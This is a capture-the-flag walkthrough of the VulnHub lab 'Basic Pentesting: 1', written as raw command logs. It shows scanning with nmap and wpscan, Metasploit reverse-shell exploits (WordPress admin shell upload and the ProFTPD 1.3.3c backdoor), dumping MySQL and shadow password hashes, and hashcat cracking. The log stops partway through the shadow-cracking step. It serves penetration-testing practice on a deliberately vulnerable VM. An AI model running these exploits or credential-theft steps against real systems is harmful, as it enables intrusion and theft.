# Basic Pentesting: 1

https://www.vulnhub.com/entry/basic-pentesting-1,216/

## Find machine on my network

```
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ sudo nmap -sn 10.0.2.0/24 --open
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-06 11:07 CEST
Nmap scan report for 10.0.2.1
Host is up (0.00026s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00038s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.3
Host is up (0.00032s latency).
MAC Address: 08:00:27:9F:CF:04 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.20
Host is up (0.00100s latency).
MAC Address: 08:00:27:F8:8D:17 (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.8
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 9.44 seconds


10.0.2.20
```

## nmap

```
# Nmap 7.92 scan initiated Sat Aug  6 11:12:44 2022 as: nmap -T4 -p- -oN 02_nmap 10.0.2.20
Nmap scan report for 10.0.2.20
Host is up (0.00017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:F8:8D:17 (Oracle VirtualBox virtual NIC)

# Nmap done at Sat Aug  6 11:12:49 2022 -- 1 IP address (1 host up) scanned in 5.12 seconds
```

## nmap with sC and sV

```
# Nmap 7.92 scan initiated Sat Aug  6 11:13:13 2022 as: nmap -T4 -p21,80 -sC -sV -oN 03_nmap_sC_sV 10.0.2.20
Nmap scan report for 10.0.2.20
Host is up (0.00029s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 08:00:27:F8:8D:17 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  6 11:13:22 2022 -- 1 IP address (1 host up) scanned in 9.55 seconds
```

## gobuster

```
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ gobuster dir -u http://10.0.2.20/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.20/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/06 11:15:51 Starting gobuster in directory enumeration mode
===============================================================
/secret               (Status: 301) [Size: 307] [--> http://10.0.2.20/secret/]
/server-status        (Status: 403) [Size: 297]

===============================================================
2022/08/06 11:16:42 Finished
===============================================================
```

## Wordpress

Found Wordpress installation on `/secret`

## /etc/hosts

added:

```
10.0.2.20       vtcsec
```

## Wordpress version

```
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ curl -L http://vtcsec/secret  |grep generator
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   301  100   301    0     0  31354      0 --:--:-- --:--:-- --:--:-- 33444
<meta name="generator" content="WordPress 4.9.20" />
100 53315    0 53315    0     0  1020k      0 --:--:-- --:--:-- --:--:-- 1020k
```

## Wpscan

```
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ wpscan --url http://vtcsec/secret --enumerate
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://vtcsec/secret/ [10.0.2.20]
[+] Started: Sat Aug  6 11:25:09 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://vtcsec/secret/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://vtcsec/secret/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://vtcsec/secret/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://vtcsec/secret/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.20 identified (Latest, released on 2022-03-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://vtcsec/secret/index.php/feed/, <generator>https://wordpress.org/?v=4.9.20</generator>
 |  - http://vtcsec/secret/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.9.20</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://vtcsec/secret/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://vtcsec/secret/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://vtcsec/secret/wp-content/themes/twentyseventeen/style.css?ver=4.9.20
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://vtcsec/secret/wp-content/themes/twentyseventeen/style.css?ver=4.9.20, Match: 'Version: 1.4'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:01 <==============================================================================================================> (474 / 474) 100.00% Time: 00:00:01
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:11 <============================================================================================================> (2575 / 2575) 100.00% Time: 00:00:11

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <=====================================================================================================================> (71 / 71) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <==========================================================================================================> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://vtcsec/secret/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Aug  6 11:25:39 2022
[+] Requests Done: 3415
[+] Cached Requests: 10
[+] Data Sent: 937.021 KB
[+] Data Received: 1.01 MB
[+] Memory used: 281.102 MB
[+] Elapsed time: 00:00:30
```

## Default Wordpress backend credentials

admin/admin

## Got www-data shell with msfconsole

```
msf6 > search wp_admin_shell

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_admin_shell_upload

msf6 > use exploit/unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.8         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD admin
PASSWORD => admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS vtcsec
RHOSTS => vtcsec
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /secret
TARGETURI => /secret
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.0.2.8:4444
[*] Authenticating with WordPress using admin:admin...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /secret/wp-content/plugins/MzWGqvLTnK/OxjALQbVQM.php...
[*] Sending stage (39927 bytes) to 10.0.2.20
[+] Deleted OxjALQbVQM.php
[+] Deleted MzWGqvLTnK.php
[+] Deleted ../MzWGqvLTnK
[*] Meterpreter session 1 opened (10.0.2.8:4444 -> 10.0.2.20:59148) at 2022-08-06 11:29:40 +0200

meterpreter > getuid
Server username: www-data
meterpreter >
```

## Upgrade shell

```
sh: 0: getcwd() failed: No such file or directory
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@vtcsec:$
```

## Got mysql credentials

```
www-data@vtcsec:/var/www/html/secret$ egrep '(DB_USER|DB_PASSW)' wp-config.php
<ml/secret$ egrep '(DB_USER|DB_PASSW)' wp-config.php
define('DB_USER', 'root');
define('DB_PASSWORD', 'arootmysqlpass');
```

## Got mysql users

```
mysql> select * from user;
select * from user;
+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
| Host      | User             | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | password_last_changed | password_lifetime | account_locked |
+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
| localhost | root             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *E4412663F157F86C6FFF95EDFC8E345ADCA70778 | N                | 2017-11-16 11:19:37   |              NULL | N              |
| localhost | mysql.session    | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | Y          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2017-11-16 11:19:37   |              NULL | Y              |
| localhost | mysql.sys        | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2017-11-16 11:19:37   |              NULL | Y              |
| localhost | debian-sys-maint | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *D84E26EC25856D85C5CF4C80BE12936158CA3015 | N                | 2017-11-16 11:19:37   |              NULL | N              |
| localhost | marlinspike      | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *F3A2A51A9B0F2BE2468926B4132313728C250DBF | N                | 2017-11-16 11:30:32   |              NULL | N              |
+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
5 rows in set (0.00 sec)

mysql>
```

## Got mysql hashes

```
mysql> SELECT SUBSTR(authentication_string,2) AS hash FROM mysql.user WHERE plugin = 'mysql_native_password' AND authentication_string NOT LIKE '%THISISNOTAVALIDPASSWORD%' AND authentication_string !='';
SELECT SUBSTR(authentication_string,2) AS hash FROM mysql.user WHERE plugin = 'mysql_native_password' AND authentication_string NOT LIKE '%THISISNOTAVALIDPASSWORD%' AND authentication_string !='';
+------------------------------------------+
| hash                                     |
+------------------------------------------+
| E4412663F157F86C6FFF95EDFC8E345ADCA70778 |
| D84E26EC25856D85C5CF4C80BE12936158CA3015 |
| F3A2A51A9B0F2BE2468926B4132313728C250DBF |
+------------------------------------------+
3 rows in set (0.00 sec)

mysql>
```

## Cracked marlinspike hash

```
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ hashcat -m 300 -a 0 ./mysql_hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-4770K CPU @ 3.50GHz, 1441/2947 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f3a2a51a9b0f2be2468926b4132313728c250dbf:foo
Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 300 (MySQL4.1/MySQL5)
Hash.Target......: ./mysql_hashes
Time.Started.....: Sat Aug  6 11:40:20 2022 (12 secs)
Time.Estimated...: Sat Aug  6 11:40:32 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1311.4 kH/s (0.13ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/3 (33.33%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 64%

Started: Sat Aug  6 11:39:28 2022
Stopped: Sat Aug  6 11:40:34 2022
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ hashcat -m 300 -a 0 ./mysql_hashes /usr/share/wordlists/rockyou.txt --show
f3a2a51a9b0f2be2468926b4132313728c250dbf:foo
```

## Got root through ProFTP vuln

```
msf6 > search ProFTPd-1.3.3c

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_133c_backdoor

msf6 > use exploit/unix/ftp/proftpd_133c_backdoor
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 10.0.2.20
RHOSTS => 10.0.2.20
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.2.20        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads

Compatible Payloads
===================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   1  payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   3  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   4  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   5  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   6  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   7  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set PAYLOAD payload/cmd/unix/reverse
PAYLOAD => cmd/unix/reverse
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.2.20        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 10.0.2.8
LHOST => 10.0.2.8
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run

[*] Started reverse TCP double handler on 10.0.2.8:4444
[*] 10.0.2.20:21 - Sending Backdoor Command

[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 6SXAiPibPHV3ncTv;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "6SXAiPibPHV3ncTv\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.0.2.8:4444 -> 10.0.2.20:59166) at 2022-08-06 11:51:05 +0200


id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
whoami
root
```

## Some enum

```
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
whoami
root
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
marlinspike:x:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
crontab -l -u marlinspike
no crontab for marlinspike
cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
id marlinspike
uid=1000(marlinspike) gid=1000(marlinspike) groups=1000(marlinspike),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
exit
```

## Looting for marlinspike

```
www-data@vtcsec:$ grep --color=auto -rnw '/' -ie "marlinspike" --color=always 2> /dev/null
<lor=auto -rnw '/' -ie "marlinspike" --color=always 2> /dev/null
/usr/lib/x86_64-linux-gnu/gtk-2.0/2.10.0/immodules.cache:5:# ModulesPath = /home/marlinspike/.gtk-2.0/2.10.0/x86_64-pc-linux-gnu/immodules:/home/marlinspike/.gtk-2.0/2.10.0/immodules:/home/marlinspike/.gtk-2.0/x86_64-pc-linux-gnu/immodules:/home/marlinspike/.gtk-2.0/immodules:/usr/lib/x86_64-linux-gnu/gtk-2.0/2.10.0/x86_64-pc-linux-gnu/immodules:/usr/lib/x86_64-linux-gnu/gtk-2.0/2.10.0/immodules:/usr/lib/x86_64-linux-gnu/gtk-2.0/x86_64-pc-linux-gnu/immodules:/usr/lib/x86_64-linux-gnu/gtk-2.0/immodules:/usr/lib/gtk-2.0/2.10.0/x86_64-pc-linux-gnu/immodules:/usr/lib/gtk-2.0/2.10.0/immodules:/usr/lib/gtk-2.0/x86_64-pc-linux-gnu/immodules:/usr/lib/gtk-2.0/immodules
/usr/share/mythes/th_en_US_v2.dat:193624:(noun)|marlinspike|marlingspike|hand tool (generic term)
/usr/share/mythes/th_en_US_v2.dat:193626:(noun)|marlinespike|marlinspike|hand tool (generic term)
/usr/share/mythes/th_en_US_v2.dat:193627:marlinspike|1
/usr/share/mythes/th_en_US_v2.idx:81306:marlinspike|10287094
/etc/group:5:adm:x:4:syslog,marlinspike
/etc/group:18:cdrom:x:24:marlinspike
/etc/group:21:sudo:x:27:marlinspike
/etc/group:23:dip:x:30:marlinspike
/etc/group:35:plugdev:x:46:marlinspike
/etc/group:52:lpadmin:x:113:marlinspike
/etc/group:67:marlinspike:x:1000:
/etc/group:68:sambashare:x:128:marlinspike
/etc/passwd:40:marlinspike:x:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash
/etc/subgid:1:marlinspike:100000:65536
/etc/subuid:1:marlinspike:100000:65536
/etc/shadow:40:marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
```

## We can read shadow!

## Crack marlinkspike hash

```
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ cat > shadow
marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
joshua@kaligra:~/Documents/vulnhub/basic_pentesting_1$ cat > passwd
marlinspike:x:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash
